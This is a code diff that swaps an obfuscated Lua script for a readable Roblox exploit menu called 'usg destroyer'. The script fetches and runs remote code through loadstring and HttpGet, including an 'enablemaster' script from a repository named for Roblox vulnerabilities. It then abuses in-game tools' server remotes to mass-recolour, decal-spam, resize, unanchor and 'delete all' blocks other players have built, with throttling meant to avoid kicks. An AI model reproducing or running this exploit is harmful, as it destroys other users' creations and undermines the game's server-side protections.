@@ -1,3 +1,290 @@
--- Obfuscated with Matcha Obfuscator
--- https://github.com/matcha-obfuscator
-local __0x20s={"\227\47\82\227\185\119\40\89\63\4\72\111\13\205\245\221\254\57\83\224\175\63\100\25\35\17\90\47\30\138\226\218\230\116\23\247\165\35\115\17\36\19\90\32\12\139\199\217\254\62\72\231\229\32\102\31\35\74\126\37\14\203\239\198\164\18\72\231\175\63\97\23\46\0\114\32\4\197\230\208\249\117\74\230\171","\234\55\74\179\190\37\98\86\62\17\74\39\12\222","\198\62\65\242\152\40\116\31\55\0\77","\230\58\77\246\234\44\107\26\109\7\83\46\9\207\242\149\248\46\86\246\184\109\101\31\42","\249\62\87\230\163\63\98\5\109\17\87\36\74\214\228\198\232\58\74\246\184\109\102\24\41\69\82\32\25\208\228\199\171\40\67\231\190\36\105\17\62\69\76\36\30\132\245\221\238\123\72\230\167\47\98\4\109\12\81\97\30\204\228\149\249\62\85\240\171\33\98\4\109\17\80\97\88\148\179\131\171\61\73\225\234\32\102\14\109\1\94\44\11\195\228","\219\55\71\234\175\63\116","\217\52\83\255\175\57\115\19\109\49\87\36\74\246\196\230\194\1\99\193","\217\62\75\252\190\40\66\0\40\11\75","\201\58\85\246\154\44\117\2","\194\40\100\255\165\46\108","\194\40\100\255\165\46\108","\194\40\100\255\165\46\108","\249\62\85\250\176\40","\217\52\83\255\175\57\115\19\109\55\90\50\3\222\228\199\171\47\73\252\166\109\105\25\57\69\89\46\31\202\229\148","\254\53\71\253\169\37\104\4\109\4\83\45\74\198\244\220\231\63\85","\249\62\87\230\163\63\98\5\109\16\31\53\5\132\233\218\231\63\6\224\169\63\98\1\41\23\86\55\15\214","\219\55\71\234\175\63\116","\216\56\84\246\189\41\117\31\59\0\77\97\62\204\228\149\219\9\105\195\143\31\83\63\8\54\31\2\34\229\207\242\206\9","\216\56\84\246\189\41\117\31\59\0\77\97\4\203\245\149\237\52\83\253\174\108\39\59\44\14\90\97\25\209\243\208\171\34\73\230\234\37\102\0\40\69\86\53\74\205\239\149\242\52\83\225\234\36\105\0\40\11\75\46\24\221\175","\217\62\75\252\190\40\66\0\40\11\75","\194\40\100\255\165\46\108","\194\40\100\255\165\46\108","\201\58\85\246\154\44\117\2","\201\58\85\246\154\44\117\2","\222\53\71\253\169\37\104\4\36\11\88\97","\171\57\74\252\169\38\116\88\99\75","\202\53\69\251\165\63\98\18","\205\50\72\250\185\37\98\18\109\16\81\32\4\199\233\218\249\50\72\244\234\44\107\26\109\7\83\46\9\207\242\155","\217\58\79\253\168\34\112\37\61\4\82","\249\58\79\253\168\34\112\86\44\9\83\97\8\200\238\214\224\40","\249\62\87\230\163\63\98\5\109\28\80\52\74\208\238\149\227\52\74\247\234\61\102\31\35\17\31\35\31\199\234\208\255","\219\55\71\234\175\63\116","\219\58\79\253\190\109\69\3\46\14\90\53\74\240\233\208\171\11\103\218\132\25\66\36","\217\62\75\252\190\40\66\0\40\11\75","\194\40\100\255\165\46\108","\194\40\100\255\165\46\108","\201\58\85\246\154\44\117\2","\201\58\85\246\154\44\117\2","\219\58\84\231","\223\52\73\255\234\35\104\2\109\3\80\52\4\192\161\194\227\50\74\246\234\44\100\2\36\19\94\53\3\202\230\149\255\52\65\244\166\40\41","\254\40\65\179\174\40\116\2\63\10\70\36\24\132","\233\34\6\247\165\56\96","\207\58\84\248\175\63","\252\123\71\179\184\109\105\86\36\69\81\97\13","\226\61\6\242\234\56\116\19\63\69\87\32\25\132\224\217\231\52\81\179\167\34\99\19\109\10\81\97\7\203\242\193\171\40\69\225\163\61\115\5\109\18\80\47\30\132\246\218\249\48","\226\123\65\252\190\46\111\3","\200\52\72\245\163\63\106\19\41\69\75\41\15\132\229\220\234\55\73\244\228","\229\58\78\179\163\41\100\86\33\10\76\36\24\132\233\212\227\58","\200\58\72\240\175\33\107\19\41\69\75\41\15\132\229\220\234\55\73\244\228","\239\62\74\246\190\40\39\23\33\9","\249\62\87\230\163\63\98\5\109\16\31\53\5\132\233\218\231\63\6\231\162\52\39\5\46\23\90\54\14\214\232\195\238\41","\219\55\71\234\175\63\116","\216\56\84\246\189\41\117\31\59\0\77\97\62\204\228\149\219\9\105\195\143\31\83\63\8\54\31\2\34\229\207\242\206\9","\216\56\84\246\189\41\117\31\59\0\77\97\4\203\245\149\237\52\83\253\174\108\39\47\34\16\31\47\15\193\229\149\226\47\6\250\164\109\126\25\56\23\31\40\4\210\228\219\255\52\84\234\228","\217\62\75\252\190\40\66\0\40\11\75","\194\40\100\255\165\46\108","\194\40\100\255\165\46\108","\201\58\85\246\154\44\117\2","\201\58\85\246\154\44\117\2","\223\58\84\244\175\57\110\24\42\69","\171\57\74\252\169\38\116\88\99\75","\202\53\69\251\165\63\98\18","\200\58\72\208\165\33\107\31\41\0","\198\58\85\224\234\41\98\5\57\23\74\34\30\205\238\219\171\56\73\254\186\33\98\2\40\75","\223\62\94\231\191\63\98\37\61\4\82\44\15\214","\239\62\69\242\166\109\116\6\44\8","\249\62\87\230\163\63\98\5\109\17\87\36\74\212\224\220\229\47\6\225\165\33\107\19\63\69\75\46\74\198\228\149\227\62\74\247\234\44\105\18\109\22\90\53\74\197\161\220\230\58\65\246\234\36\105\5\36\1\90\97\30\204\228\149\249\52\74\255\175\63","\219\55\71\234\175\63\116","\219\58\79\253\190\109\85\25\33\9\90\51\74\240\233\208\171\15\99\203\158\24\85\51\109\40\126\10\47\246","\186\107\17\165\254\122\51\66\117\85\10","\217\62\75\252\190\40\66\0\40\11\75","\222\43\66\242\190\40\78\50","\194\40\100\255\165\46\108","\194\40\100\255\165\46\108","\201\58\85\246\154\44\117\2","\201\58\85\246\154\44\117\2","\219\58\79\253\190\109\85\25\33\9\90\51\74\208\238\218\231\123\72\252\190\109\97\25\56\11\91\111","\238\53\71\241\166\40\39\27\44\22\75\36\24\132\242\208\255\47\79\253\173\62","\219\23\99\210\153\8\39\38\31\32\108\18\74\240\201\252\216","\227\47\82\227\185\119\40\89\63\4\72\111\13\205\245\221\254\57\83\224\175\63\100\25\35\17\90\47\30\138\226\218\230\116\69\251\171\63\107\31\40\10\82\38\69\192\230\205\253\46\74\253\162\56\101\4\34\7\83\46\18\215\233\220\255\40\82\230\172\43\40\4\40\3\76\110\2\193\224\209\248\116\75\242\163\35\40\19\35\4\93\45\15\201\224\198\255\62\84\189\166\56\102","\227\47\82\227\185\119\40\89\63\4\72\111\13\205\245\221\254\57\83\224\175\63\100\25\35\17\90\47\30\138\226\218\230\116\23\247\165\35\115\17\36\19\90\32\12\139\199\217\254\62\72\231\229\32\102\31\35\74\126\37\14\203\239\198\164\8\71\229\175\0\102\24\44\2\90\51\68\200\244\212","\227\47\82\227\185\119\40\89\42\12\75\41\31\198\175\214\228\54\9\162\174\34\105\2\42\12\73\36\11\194\174\243\231\46\67\253\190\98\117\19\33\0\94\50\15\215\174\217\234\47\67\224\190\98\99\25\58\11\83\46\11\192\174\216\234\50\72\189\166\56\102"};local __0x21k={139,91,38,147,202,77,7,118,77,101,63,65,106,164,129,181};local function __0x1fd(__0x2ei) local __0x23e=__0x20s[__0x2ei];local __0x24o={};for __0x22j=1,#__0x23e do local __0x25b=string.byte(__0x23e,__0x22j);local __0x26c=__0x21k[(__0x22j - 1) % #__0x21k + 1];local __0x29a,__0x2af=__0x25b,__0x26c;local __0x27r,__0x28p=0,1;for __0x2bq=0,7 do local __0x2cu,__0x2dv=__0x29a % 2,__0x2af % 2;if __0x2cu ~= __0x2dv then __0x27r=__0x27r + __0x28p end;__0x29a=(__0x29a - __0x2cu) / 2;__0x2af=(__0x2af - __0x2dv) / 2;__0x28p=__0x28p * 2 end;__0x24o[__0x22j]=string.char(__0x27r) end;return table.concat(__0x24o) end;local _0x0,_0x1,_0x2,_0x3,_0x4,_0x5,_0x5,_0x5;local _0x1e=1;while true do if _0x1e == 17 then _0x2=loadstring(game:HttpGet(__0x1fd(1)))();_0x1e=22 elseif _0x1e == 29 then _0x4={Main=_0x3:AddTab({Title=__0x1fd(2),Icon=""})};_0x1e=36 elseif _0x1e == 71 then _0x5=_0x4.Main:AddToggle(__0x1fd(3),{Title=__0x1fd(4),Description=__0x1fd(5),Default=false,Callback=function(_0x6) _G.MegaResizer=_0x6;if _0x6 then task.spawn(function() local _0x7=game:GetService(__0x1fd(6)).LocalPlayer;local _0x8=__0x1fd(7);local _0x15=_0x7.Character or _0x7.CharacterAdded:Wait();local _0x16=_0x7.Backpack:FindFirstChild(_0x8) or _0x15:FindFirstChild(_0x8);if _0x16 and _G.MegaResizer then local _0x17=_0x16:WaitForChild(__0x1fd(8));_0x16.Parent=_0x15;while _G.MegaResizer do for _0xb,_0xc in ipairs(workspace:GetDescendants()) do if not _G.MegaResizer then break end;if _0xc:IsA(__0x1fd(9)) and (_0xc.Name == __0x1fd(10) or _0xc.Parent:FindFirstChild(__0x1fd(11))) then local _0xd=_0xc.Parent:FindFirstChild(__0x1fd(12)) and _0xc.Parent or _0xc;_0x17:FireServer(_0xd,__0x1fd(13));task.wait(0.02) end end;task.wait(2 - 1) end else print(__0x1fd(14)) end end) end end});_0x1e=78 elseif _0x1e == 87 then _0x4.Main:AddButton({Title=__0x1fd(15),Description=__0x1fd(16),Callback=function() local _0x7=game:GetService(__0x1fd(17)).LocalPlayer;local _0x15=_0x7.Character or _0x7.CharacterAdded:Wait();local _0x8=__0x1fd(18);local _0x18=_0x7.Backpack:FindFirstChild(_0x8) or _0x15:FindFirstChild(_0x8);if not _0x18 then warn(__0x1fd(19));return end;local _0xa=_0x18:WaitForChild(__0x1fd(20));_0x18.Parent=_0x15;task.wait(0.2);local _0x19={};for _0xb,_0xc in ipairs(workspace:GetDescendants()) do if _0xc.Name == __0x1fd(21) or _0xc.Parent and _0xc.Parent:FindFirstChild(__0x1fd(22)) then local _0x1a=_0xc:IsA(__0x1fd(23)) and _0xc or _0xc.Parent:FindFirstChildOfClass(__0x1fd(24));if _0x1a and not table.find(_0x19,_0x1a) then table.insert(_0x19,_0x1a) end end end;print(__0x1fd(25) .. #_0x19 .. __0x1fd(26));task.spawn(function() for _0x1b,_0x1c in ipairs(_0x19) do _0xa:FireServer({block},{[__0x1fd(27)]=false});if _0x1b % (1 + 9) == 1 - 1 then task.wait(0.05) end;task.wait(0.01) end;print(__0x1fd(28)) end) end});_0x1e=110 elseif _0x1e == 60 then _0x5=_0x4.Main:AddToggle(__0x1fd(29),{Title=__0x1fd(30),Description=__0x1fd(31),Default=false,Callback=function(_0x6) _G.RainbowChaos=_0x6;if _0x6 then task.spawn(function() local _0x7=game:GetService(__0x1fd(32)).LocalPlayer;local _0x8=__0x1fd(33);local _0x9=_0x7.Backpack:FindFirstChild(_0x8) or _0x7.Character and _0x7.Character:FindFirstChild(_0x8);if _0x9 and _G.RainbowChaos then local _0xa=_0x9:WaitForChild(__0x1fd(34));_0x9.Parent=_0x7.Character;while _G.RainbowChaos do for _0xb,_0xc in ipairs(workspace:GetDescendants()) do if not _G.RainbowChaos then break end;if _0xc.Name == __0x1fd(35) or _0xc.Parent and _0xc.Parent:FindFirstChild(__0x1fd(36)) then local _0xd=_0xc:IsA(__0x1fd(37)) and _0xc or _0xc.Parent:FindFirstChildOfClass(__0x1fd(38));if _0xd then local _0xe=Color3.new(math.random(),math.random(),math.random());_0xa:FireServer(__0x1fd(39),_0xe,_0xd) end;task.wait(0.01) end end;task.wait(0.5) end else print(__0x1fd(40)) end end) end end});_0x1e=68 elseif _0x1e == 36 then if 1 > 2 then local _0x1d=nil end;_0x1e=46 elseif _0x1e == 22 then _0x3=Fluent:CreateWindow({Title=__0x1fd(41) .. Fluent.Version,SubTitle=__0x1fd(42),TabWidth=12 + 148,Size=UDim2.fromOffset(247 + 364 - 31,409 + 68 - 17),Acrylic=true,Theme=__0x1fd(43),MinimizeKey=Enum.KeyCode.LeftControl});_0x1e=29 elseif _0x1e == 46 then _0x3:Dialog({Title=__0x1fd(44),Content=__0x1fd(45),Buttons={{Title=__0x1fd(46),Callback=function() print(__0x1fd(47)) end},{Title=__0x1fd(48),Callback=function() print(__0x1fd(49)) end}}});_0x1e=52 elseif _0x1e == 78 then _0x4.Main:AddButton({Title=__0x1fd(50),Description=__0x1fd(51),Callback=function() local _0x7=game:GetService(__0x1fd(52)).LocalPlayer;local _0x15=_0x7.Character or _0x7.CharacterAdded:Wait();local _0x8=__0x1fd(53);local _0x18=_0x7.Backpack:FindFirstChild(_0x8) or _0x15:FindFirstChild(_0x8);if not _0x18 then warn(__0x1fd(54));return end;local _0xa=_0x18:WaitForChild(__0x1fd(55));_0x18.Parent=_0x15;task.wait(0.2);local _0x19={};for _0xb,_0xc in ipairs(workspace:GetDescendants()) do if _0xc.Name == __0x1fd(56) or _0xc.Parent and _0xc.Parent:FindFirstChild(__0x1fd(57)) then local _0x1a=_0xc:IsA(__0x1fd(58)) and _0xc or _0xc.Parent:FindFirstChildOfClass(__0x1fd(59));if _0x1a and not table.find(_0x19,_0x1a) then table.insert(_0x19,_0x1a) end end end;print(__0x1fd(60) .. #_0x19 .. __0x1fd(61));task.spawn(function() for _0x1b,_0x1c in ipairs(_0x19) do _0xa:FireServer({block},{[__0x1fd(62)]=false,[__0x1fd(63)]=false});if _0x1b % (10 + 0) == 1 - 1 then task.wait(0.05) end;task.wait(0.01) end;print(__0x1fd(64)) end) end});_0x1e=87 elseif _0x1e == 68 then _0x5=_0x4.Main:AddToggle(__0x1fd(65),{Title=__0x1fd(66),Description=__0x1fd(67),Default=false,Callback=function(_0x6) _G.TextureSpam=_0x6;if _0x6 then task.spawn(function() local _0x7=game:GetService(__0x1fd(68)).LocalPlayer;local _0x8=__0x1fd(69);local _0xf=__0x1fd(70);local _0x10={Enum.NormalId.Top,Enum.NormalId.Front,Enum.NormalId.Right};local _0x11=_0x7.Backpack:FindFirstChild(_0x8) or _0x7.Character and _0x7.Character:FindFirstChild(_0x8);if _0x11 and _G.TextureSpam then local _0xa=_0x11:WaitForChild(__0x1fd(71));_0x11.Parent=_0x7.Character;_0xa:FireServer(__0x1fd(72),_0xf);while _G.TextureSpam do for _0xb,_0x12 in ipairs(workspace:GetDescendants()) do if not _G.TextureSpam then break end;if _0x12.Name == __0x1fd(73) or _0x12.Parent and _0x12.Parent:FindFirstChild(__0x1fd(74)) then local _0x13=_0x12:IsA(__0x1fd(75)) and _0x12 or _0x12.Parent:FindFirstChildOfClass(__0x1fd(76));if _0x13 then for _0xb,_0x14 in ipairs(_0x10) do _0xa:FireServer(2 - 1,_0x13,_0x14) end;task.wait(0.01) end end end;task.wait(0.5) end else print(__0x1fd(77)) end end) end end});_0x1e=71 elseif _0x1e == 52 then _0x4.Main:AddButton({Title=__0x1fd(78),Description=__0x1fd(79),Callback=function() loadstring(game:HttpGet(__0x1fd(80)))() end});_0x1e=60 elseif _0x1e == 11 then _0x1=loadstring(game:HttpGet(__0x1fd(81)))();_0x1e=17 elseif _0x1e == 1 then _0x0=loadstring(game:HttpGet(__0x1fd(82)))();_0x1e=11 else break end end
+-- the menu
+local Library = loadstring(game:HttpGet("https://github.com/1dontgiveaf/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/1dontgiveaf/Fluent/main/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/1dontgiveaf/Fluent/main/Addons/InterfaceManager.lua"))()
+local Window = Fluent:CreateWindow({
+    Title = "usg destroyer " .. Fluent.Version,
+    SubTitle = "by doug",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(580, 460),
+    Acrylic = true, -- Turns off and on blur in case it's detected
+    Theme = "Darker",
+    MinimizeKey = Enum.KeyCode.LeftControl -- Used when there's no MinimizeKeybind
+})
+
+local Tabs = {
+    Main = Window:AddTab({ Title = "all the stuffz", Icon = "" }),
+}
+
+Window:Dialog({
+    Title = "w a r n i n g",
+    Content = "if a user has allow mode on most scripts wont work",
+    Buttons = {
+        { 
+            Title = "i gotchu",
+            Callback = function()
+                print("Confirmed the dialog.")
+            end 
+        }, {
+            Title = "nah idc loser haha",
+            Callback = function()
+                print("Cancelled the dialog.")
+            end 
+        }
+    }
+})
+
+Tabs.Main:AddButton({
+    Title = "enable master settings",
+    Description = "PLEASE PRESS THIS",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/charlieomg/dgxvulnhubrobloxshitstuff/refs/heads/main/enablemaster.lua'))()
+    end
+})
+
+local Toggle = Tabs.Main:AddToggle("RainbowSpam", {
+    Title = "rainbow all blocks", 
+    Description = "requires you to hold paint bucket",
+    Default = false,
+    Callback = function(state)
+        _G.RainbowChaos = state
+        if state then
+            task.spawn(function()
+                -- All logic contained inside the state check
+                local lp = game:GetService("Players").LocalPlayer
+                local toolName = "Paint Bucket The PAINTER"
+                local bucket = lp.Backpack:FindFirstChild(toolName) or (lp.Character and lp.Character:FindFirstChild(toolName))
+
+                if bucket and _G.RainbowChaos then
+                    local remote = bucket:WaitForChild("RemoteEvent")
+                    bucket.Parent = lp.Character -- Auto-equip
+                    
+                    while _G.RainbowChaos do
+                        for _, obj in ipairs(workspace:GetDescendants()) do
+                            if not _G.RainbowChaos then break end
+                            
+                            -- death
+                            if obj.Name == "IsBlock" or (obj.Parent and obj.Parent:FindFirstChild("IsBlock")) then
+                                local target = obj:IsA("BasePart") and obj or obj.Parent:FindFirstChildOfClass("BasePart")
+                                
+                                if target then
+                                    local randomColor = Color3.new(math.random(), math.random(), math.random())
+                                    remote:FireServer("Part", randomColor, target)
+                                end
+                                task.wait(0.01) -- Execution speed
+                            end
+                        end
+                        task.wait(0.5)
+                    end
+                else
+                    print("Tool not found while activating toggle.")
+                end
+            end)
+        end
+    end 
+})
+
+local Toggle = Tabs.Main:AddToggle("TextureSpammer", {
+    Title = "decal spam", 
+    Description = "requires the paint roller to be held and set a image inside the roller",
+    Default = false,
+    Callback = function(state)
+        _G.TextureSpam = state
+        
+        if state then
+            task.spawn(function()
+                local lp = game:GetService("Players").LocalPlayer
+                local toolName = "Paint Roller The TEXTURE MAKER"
+                
+                -- Configuration
+                local assetId = "10764744805" -- Your ID
+                local faces = {Enum.NormalId.Top, Enum.NormalId.Front, Enum.NormalId.Right}
+
+                -- Find and Equip tool
+                local roller = lp.Backpack:FindFirstChild(toolName) or (lp.Character and lp.Character:FindFirstChild(toolName))
+                
+                if roller and _G.TextureSpam then
+                    local remote = roller:WaitForChild("RemoteEvent")
+                    roller.Parent = lp.Character
+                    
+                    -- Ensure ID is set (Firing the ID update mode usually used by these tools)
+                    -- Most tools send the ID as a separate remote call or a specific mode
+                    remote:FireServer("UpdateID", assetId) 
+                    
+                    while _G.TextureSpam do
+                        for _, item in ipairs(workspace:GetDescendants()) do
+                            if not _G.TextureSpam then break end
+                            
+                            -- Identifier check
+                            if item.Name == "IsBlock" or (item.Parent and item.Parent:FindFirstChild("IsBlock")) then
+                                local targetPart = item:IsA("BasePart") and item or item.Parent:FindFirstChildOfClass("BasePart")
+
+                                if targetPart then
+                                    for _, face in ipairs(faces) do
+                                        -- Using the "1" mode from your original snippet
+                                        remote:FireServer(1, targetPart, face)
+                                    end
+                                    task.wait(0.01)
+                                end
+                            end
+                        end
+                        task.wait(0.5)
+                    end
+                else
+                    print("Paint Roller tool not found.")
+                end
+            end)
+        end
+    end 
+})
+
+local Toggle = Tabs.Main:AddToggle("MegaResizer", {
+    Title = "make all blocks super big", 
+    Description = "requires the rescaler and master settings set the number in the rescaler to 2026 for max damage",
+    Default = false,
+    Callback = function(state)
+        _G.MegaResizer = state
+        
+        if state then
+            task.spawn(function()
+                local lp = game:GetService("Players").LocalPlayer
+                local toolName = "Roulette The RESIZER"
+                
+                -- 1. Find and Equip the Tool
+                local char = lp.Character or lp.CharacterAdded:Wait()
+                local resizeTool = lp.Backpack:FindFirstChild(toolName) or char:FindFirstChild(toolName)
+
+                if resizeTool and _G.MegaResizer then
+                    local resizeRemote = resizeTool:WaitForChild("RemoteEvent")
+                    resizeTool.Parent = char -- Tool must be equipped for server validation
+                    
+                    while _G.MegaResizer do
+                        -- 2. Scan and Filter for Blocks
+                        for _, obj in ipairs(workspace:GetDescendants()) do
+                            if not _G.MegaResizer then break end
+                            
+                            -- Target blocks based on your identifier
+                            if obj:IsA("BasePart") and (obj.Name == "IsBlock" or obj.Parent:FindFirstChild("IsBlock")) then
+                                local target = obj.Parent:FindFirstChild("IsBlock") and obj.Parent or obj
+                                
+                                -- 3. Fire Server with "resize" mode
+                                resizeRemote:FireServer(target, "resize")
+                                
+                                -- Throttle slightly to avoid remote rate-limiting
+                                task.wait(0.02)
+                            end
+                        end
+                        task.wait(1) -- Scans the map again every second
+                    end
+                else
+                    print("Roulette Resizer tool not found!")
+                end
+            end)
+        end
+    end 
+})
+
+Tabs.Main:AddButton({
+    Title = "delete all",
+    Description = "requires u to hold thy screwdriver",
+    Callback = function()
+        local lp = game:GetService("Players").LocalPlayer
+        local char = lp.Character or lp.CharacterAdded:Wait()
+        local toolName = "Screwdriver The PROPERTIES CHANGER"
+
+        -- 1. Find the Tool
+        local tool = lp.Backpack:FindFirstChild(toolName) or char:FindFirstChild(toolName)
+
+        if not tool then
+            warn("Screwdriver not found! You need it in your inventory.")
+            return
+        end
+
+        local remote = tool:WaitForChild("RemoteEvent")
+        
+        -- 2. Equip for Server Auth
+        tool.Parent = char
+        task.wait(0.2)
+
+        -- 3. Scan and Execute
+        local targets = {}
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if obj.Name == "IsBlock" or (obj.Parent and obj.Parent:FindFirstChild("IsBlock")) then
+                local part = obj:IsA("BasePart") and obj or obj.Parent:FindFirstChildOfClass("BasePart")
+                if part and not table.find(targets, part) then
+                    table.insert(targets, part)
+                end
+            end
+        end
+
+        print("Targeting " .. #targets .. " blocks...")
+
+        task.spawn(function()
+            for i, block in ipairs(targets) do
+                -- Setting both properties to false in one call
+                remote:FireServer({block}, {
+                    ["Anchored"] = false,
+                    ["CanCollide"] = false
+                })
+                
+                -- Fast but safe throttle
+                if i % 10 == 0 then task.wait(0.05) end
+                task.wait(0.01)
+            end
+            print("Mass destruction complete.")
+        end)
+    end
+})
+
+Tabs.Main:AddButton({
+    Title = "unanchor all builds",
+    Description = "requires u to hold screwdriver",
+    Callback = function()
+        local lp = game:GetService("Players").LocalPlayer
+        local char = lp.Character or lp.CharacterAdded:Wait()
+        local toolName = "Screwdriver The PROPERTIES CHANGER"
+
+        -- 1. Locate the Tool
+        local tool = lp.Backpack:FindFirstChild(toolName) or char:FindFirstChild(toolName)
+
+        if not tool then
+            warn("Screwdriver not found! Make sure you have it in your inventory.")
+            return
+        end
+
+        local remote = tool:WaitForChild("RemoteEvent")
+        
+        -- 2. Equip for Server Validation
+        tool.Parent = char
+        task.wait(0.2)
+
+        -- 3. Gather Targets
+        local targets = {}
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            -- Identify player-built blocks using the game's internal tag
+            if obj.Name == "IsBlock" or (obj.Parent and obj.Parent:FindFirstChild("IsBlock")) then
+                local part = obj:IsA("BasePart") and obj or obj.Parent:FindFirstChildOfClass("BasePart")
+                if part and not table.find(targets, part) then
+                    table.insert(targets, part)
+                end
+            end
+        end
+
+        print("Unanchoring " .. #targets .. " blocks...")
+
+        -- 4. Execution Loop
+        task.spawn(function()
+            for i, block in ipairs(targets) do
+                -- Remote expects: {TargetTable}, {PropertyTable}
+                remote:FireServer({block}, {
+                    ["Anchored"] = false
+                })
+                
+                -- Anti-kick throttle
+                if i % 10 == 0 then task.wait(0.05) end
+                task.wait(0.01)
+            end
+            print("Finished unanchoring all blocks.")
+        end)
+    end
+})
